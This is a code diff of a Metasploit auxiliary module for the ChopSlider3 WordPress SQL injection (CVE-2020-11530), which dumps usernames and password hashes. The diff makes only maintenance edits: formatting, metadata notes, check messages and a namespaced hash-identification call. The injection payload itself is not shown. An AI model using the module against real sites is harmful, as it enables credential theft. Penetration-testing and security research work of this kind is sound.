@@ -8,8 +8,6 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Auxiliary::Scanner
   include Msf::Exploit::SQLi
 
-  require 'metasploit/framework/hashes/identify'
-
   def initialize(info = {})
     super(
       update_info(
@@ -22,22 +20,25 @@ class MetasploitModule < Msf::Auxiliary
           parameters, and thus must be encoded,
           and magic_quotes is applied at the server.
         },
-        'Author' =>
-          [
-            'h00die', # msf module
-            'SunCSR', # edb module
-            'Callum Murphy <callum.a.murphy.77@gmail.com>' # full disclosure
-          ],
+        'Author' => [
+          'h00die', # msf module
+          'SunCSR', # edb module
+          'Callum Murphy <callum.a.murphy.77@gmail.com>' # full disclosure
+        ],
         'License' => MSF_LICENSE,
-        'References' =>
-          [
-            ['EDB', '48457'],
-            ['CVE', '2020-11530'],
-            ['URL', 'https://seclists.org/fulldisclosure/2020/May/26']
-          ],
+        'References' => [
+          ['EDB', '48457'],
+          ['CVE', '2020-11530'],
+          ['URL', 'https://seclists.org/fulldisclosure/2020/May/26']
+        ],
         'Actions' => [
           ['List Users', { 'Description' => 'Queries username, password hash for COUNT users' }],
         ],
+        'Notes' => {
+          'Stability' => [CRASH_SAFE],
+          'Reliability' => [],
+          'SideEffects' => [IOC_IN_LOGS]
+        },
         'DefaultAction' => 'List Users',
         'DisclosureDate' => '2020-05-12'
       )
@@ -57,10 +58,10 @@ class MetasploitModule < Msf::Auxiliary
       v = Rex::Version.new(Regexp.last_match(1))
       print_status "Version detected: #{v}"
       if v <= Rex::Version.new('3.4')
-        return Msf::Exploit::CheckCode::Appears
+        return Msf::Exploit::CheckCode::Appears("ChopSlider version #{v} appears to be vulnerable")
       end
     end
-    Msf::Exploit::CheckCode::Unknown
+    Msf::Exploit::CheckCode::Unknown('ChopSlider plugin not detected')
   end
 
   def run_host(ip)
@@ -76,7 +77,7 @@ class MetasploitModule < Msf::Auxiliary
       vprint_error('ChopSlider3 version not vulnerable or undetected')
       return
     else
-      print_good('Vulnerable version detected')
+      print_good('Vulnerable version of ChopSlider3 detected')
     end
 
     sliderid = Rex::Text.rand_text_numeric(8..10)
@@ -116,7 +117,7 @@ class MetasploitModule < Msf::Auxiliary
         module_fullname: fullname,
         username: user[0],
         private_type: :nonreplayable_hash,
-        jtr_format: identify_hash(user[1]),
+        jtr_format: Metasploit::Framework::Hashes.identify_hash(user[1]),
         private_data: user[1],
         service_name: 'Wordpress',
         address: ip,
